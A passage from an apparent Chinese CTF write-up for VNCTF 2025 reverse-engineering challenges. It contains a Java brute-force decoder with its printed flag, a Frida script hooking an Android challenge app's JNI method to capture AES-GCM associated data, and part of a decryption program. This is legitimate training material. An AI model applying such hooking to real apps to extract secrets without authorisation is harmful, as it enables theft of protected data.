class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, Character&gt; fish_dcode;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Character, String&gt; fish_ecode;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">strr</span> <span class="operator">=</span> <span class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">()</span> &#123;</span><br><span class="line">        encode_map();</span><br><span class="line">        decode_map();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">encode_map</span><span class="params">()</span> &#123;</span><br><span class="line">        HashMap&lt;Character, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode = hashMap;</span><br><span class="line">        hashMap.put(<span class="string">&#x27;a&#x27;</span>, <span class="string">&quot;iiijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;b&#x27;</span>, <span class="string">&quot;jjjii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;c&#x27;</span>, <span class="string">&quot;jijij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;d&#x27;</span>, <span class="string">&quot;jjijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;e&#x27;</span>, <span class="string">&quot;jjjjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;f&#x27;</span>, <span class="string">&quot;ijjjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;g&#x27;</span>, <span class="string">&quot;jjjji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;h&#x27;</span>, <span class="string">&quot;iijii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;i&#x27;</span>, <span class="string">&quot;ijiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;j&#x27;</span>, <span class="string">&quot;iiiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;k&#x27;</span>, <span class="string">&quot;jjjij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;l&#x27;</span>, <span class="string">&quot;jijji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;m&#x27;</span>, <span class="string">&quot;ijiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;n&#x27;</span>, <span class="string">&quot;iijji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;o&#x27;</span>, <span class="string">&quot;ijjij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;p&#x27;</span>, <span class="string">&quot;jiiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;q&#x27;</span>, <span class="string">&quot;ijijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;r&#x27;</span>, <span class="string">&quot;jijii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;s&#x27;</span>, <span class="string">&quot;iiiii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;t&#x27;</span>, <span class="string">&quot;jjiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;u&#x27;</span>, <span class="string">&quot;ijjji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;v&#x27;</span>, <span class="string">&quot;jiiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;w&#x27;</span>, <span class="string">&quot;iiiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;x&#x27;</span>, <span class="string">&quot;iijij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;y&#x27;</span>, <span class="string">&quot;jjiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;z&#x27;</span>, <span class="string">&quot;jijjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;1&#x27;</span>, <span class="string">&quot;iijjl&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;iiilj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;3&#x27;</span>, <span class="string">&quot;iliii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;4&#x27;</span>, <span class="string">&quot;jiili&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;5&#x27;</span>, <span class="string">&quot;jilji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;iliji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;7&#x27;</span>, <span class="string">&quot;jjjlj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;8&#x27;</span>, <span class="string">&quot;ijljj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;9&#x27;</span>, <span class="string">&quot;iljji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;0&#x27;</span>, <span class="string">&quot;jjjli&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decode_map</span><span class="params">()</span> &#123;</span><br><span class="line">        HashMap&lt;String, Character&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode = hashMap;</span><br><span class="line">        hashMap.put(<span class="string">&quot;iiijj&quot;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjii&quot;</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijij&quot;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjijj&quot;</span>, <span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjjj&quot;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjjj&quot;</span>, <span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjji&quot;</span>, <span class="string">&#x27;g&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijii&quot;</span>, <span class="string">&#x27;h&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijiji&quot;</span>, <span class="string">&#x27;i&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiji&quot;</span>, <span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjij&quot;</span>, <span class="string">&#x27;k&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijji&quot;</span>, <span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijiij&quot;</span>, <span class="string">&#x27;m&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijji&quot;</span>, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjij&quot;</span>, <span class="string">&#x27;o&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiiji&quot;</span>, <span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijijj&quot;</span>, <span class="string">&#x27;q&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijii&quot;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiii&quot;</span>, <span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjiij&quot;</span>, <span class="string">&#x27;t&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjji&quot;</span>, <span class="string">&#x27;u&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiiij&quot;</span>, <span class="string">&#x27;v&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiij&quot;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijij&quot;</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjiji&quot;</span>, <span class="string">&#x27;y&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijjj&quot;</span>, <span class="string">&#x27;z&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijjl&quot;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiilj&quot;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iliii&quot;</span>, <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiili&quot;</span>, <span class="string">&#x27;4&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jilji&quot;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iliji&quot;</span>, <span class="string">&#x27;6&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjlj&quot;</span>, <span class="string">&#x27;7&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijljj&quot;</span>, <span class="string">&#x27;8&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iljji&quot;</span>, <span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjli&quot;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">encode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            sb.append(<span class="built_in">this</span>.fish_ecode.get(Character.valueOf(str.charAt(i))));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">decode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i2 &lt; str.length() / <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> i + <span class="number">5</span>;</span><br><span class="line">            sb.append(<span class="built_in">this</span>.fish_dcode.get(str.substring(i, i3)));</span><br><span class="line">            i2++;</span><br><span class="line">            i = i3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encrypt</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] str1 = str.getBytes();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str1.length; i++) &#123;</span><br><span class="line">            str1[i] = (<span class="type">byte</span>) (str1[i] + <span class="number">68</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexStringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : str1) &#123;</span><br><span class="line">            hexStringBuilder.append(String.format(<span class="string">&quot;%02x&quot;</span>, Byte.valueOf(b)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> hexStringBuilder.toString();</span><br><span class="line">        <span class="type">char</span>[] str3 = str2.toCharArray();</span><br><span class="line">        codes(str3, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; str3.length; i2++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (str3[i2] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; str3[i2] &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">                str3[i2] = (<span class="type">char</span>) ((str3[i2] - <span class="string">&#x27;1&#x27;</span>) + (i2 % <span class="number">4</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                str3[i2] = (<span class="type">char</span>) (str3[i2] + <span class="string">&#x27;7&#x27;</span> + (i2 % <span class="number">10</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(str3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">codes</span><span class="params">(<span class="type">char</span>[] a, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= a.length - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a[index] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        a[index + <span class="number">1</span>] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        a[index] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        codes(a, index + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 解密一层</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">encflag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>().decode(<span class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(encflag);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">candidates</span> <span class="operator">=</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_!?.~&amp;*()_+=@#$%^&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">decrypted</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">currentIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 爆破</span></span><br><span class="line">        <span class="keyword">while</span> (currentIndex &lt; encflag.length())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">found</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历候选字符</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : candidates.toCharArray())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 加密</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">encrypted</span> <span class="operator">=</span> encrypt(decrypted + String.valueOf(c));</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 判断加密后的后两个字符是否与目标字符串匹配</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> encrypted.substring(currentIndex, currentIndex + <span class="number">2</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> encflag.substring(currentIndex, currentIndex + <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (s1.equals(s2))</span><br><span class="line">                &#123;</span><br><span class="line">                    decrypted.append(c);</span><br><span class="line">                    currentIndex += <span class="number">2</span>;</span><br><span class="line">                    found = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出还原的明文</span></span><br><span class="line">        System.out.println(decrypted.toString());</span><br><span class="line">        <span class="comment">// VNCTF&#123;u_re4l1y_kn0w_H0Ok_my_f1Sh!1l&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{u_re4l1y_kn0w_H0Ok_my_f1Sh!1l}</strong></p><h3 id="kotlindroid"><a href="#kotlindroid" class="headerlink" title="kotlindroid"></a>kotlindroid</h3><p>jadx分析发现有个check函数，这个Base64加密后的应该就是Flag，然后查看交叉调用找到上层。</p><p><img src="/2025/02/12/VNCTF2025/kot1.png" alt="d0aed962ce69b047bd07052cc50206ac"></p><p>发现下面这边调用了check，传进来了一个key，直接动调断点获取。</p><p><img src="/2025/02/12/VNCTF2025/kot2.png" alt="img"></p><p>在这边断点，即可看到两个modifiedKey数组，合并起来就是16字节的Key了。</p><p>{97,116,114,105,107,101,121,115,115,121,101,107,105,114,116,97}</p><p><img src="/2025/02/12/VNCTF2025/kot3.png" alt="cd8e014f2fe16b9a2a1bba1e2226049e"></p><p>但是这边没看到和base64相关加密，全局搜索base64在SearchActivityKt$sec$1中的invokeSuspend函数中看到。</p><p>这边应该就是那边check函数invoke后跳过来的，可以看到是AES GCM加密，IV是”114514”，Key是Check那边断点拿到的，AAD数据没法直接获取，使用frida hook拦截JNI.INSTANCE.getAt()函数。</p><p><img src="/2025/02/12/VNCTF2025/kot4.png" alt="QQ_1739079484622"></p><p><img src="/2025/02/12/VNCTF2025/kot5.png" alt="QQ_1739079580281"></p><p>frida代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">package_name = <span class="string">&quot;com.atri.ezcompose&quot;</span></span><br><span class="line"></span><br><span class="line">hook_script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    try &#123;</span></span><br><span class="line"><span class="string">        var JNI = Java.use(&#x27;com.atri.ezcompose.JNI&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var instance = JNI.INSTANCE.value;</span></span><br><span class="line"><span class="string">        console.log(&#x27;INSTANCE: &#x27; + instance);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        instance.getAt.implementation = function () &#123;</span></span><br><span class="line"><span class="string">            var result = this.getAt();</span></span><br><span class="line"><span class="string">            console.log(&quot;getAt result: &quot; + result);</span></span><br><span class="line"><span class="string">            return result;</span></span><br><span class="line"><span class="string">        &#125;;</span></span><br><span class="line"><span class="string">    &#125; catch (e) &#123;</span></span><br><span class="line"><span class="string">        console.log(&quot;Error: &quot; + e);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    device = frida.get_usb_device()</span><br><span class="line">    session = device.attach(<span class="string">&quot;ezCompose&quot;</span>)</span><br><span class="line">    script = session.create_script(hook_script)</span><br><span class="line">    script.load()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># INSTANCE: com.atri.ezcompose.JNI@f264edc</span></span><br><span class="line"><span class="comment"># getAt result: mysecretadd</span></span><br></pre></td></tr></table></figure><p>拦截到ADD数据为”mysecretadd”</p><p>可以从主加密流程看到最后Base64是将IV加上被加密数据后在进行编码，所以将被加密的Flag进行Base64解码后去掉前面的”114514”就是原密文。</p><p>使用java进行解密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.GCMParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">IV</span> <span class="operator">=</span> <span class="string">&quot;114514&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] Key = &#123;<span class="number">97</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">121</span>,<span class="number">101</span>,<span class="number">107</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">97</span>&#125;;</span><br><span class="line">        <span class="type">byte</span>[] AAdBytes = &#123;<span class="number">109</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">100</span>,<span class="number">100</span>&#125;;</span><br><span class="line">        <span class="comment">// 原密文</span></span><br><span class="line">        <span class="type">int</span> [] Enc  = &#123;<span class="number">0x1c</span>,<span class="number">0xcb</span>,<span class="number">0x89</span>,<span class="number">0x28</span>,<span class="number">0xb3</span>,<span class="number">0x96</span>,<span class="number">0xd4</span>,<span class="number">0x1a</span>,<span 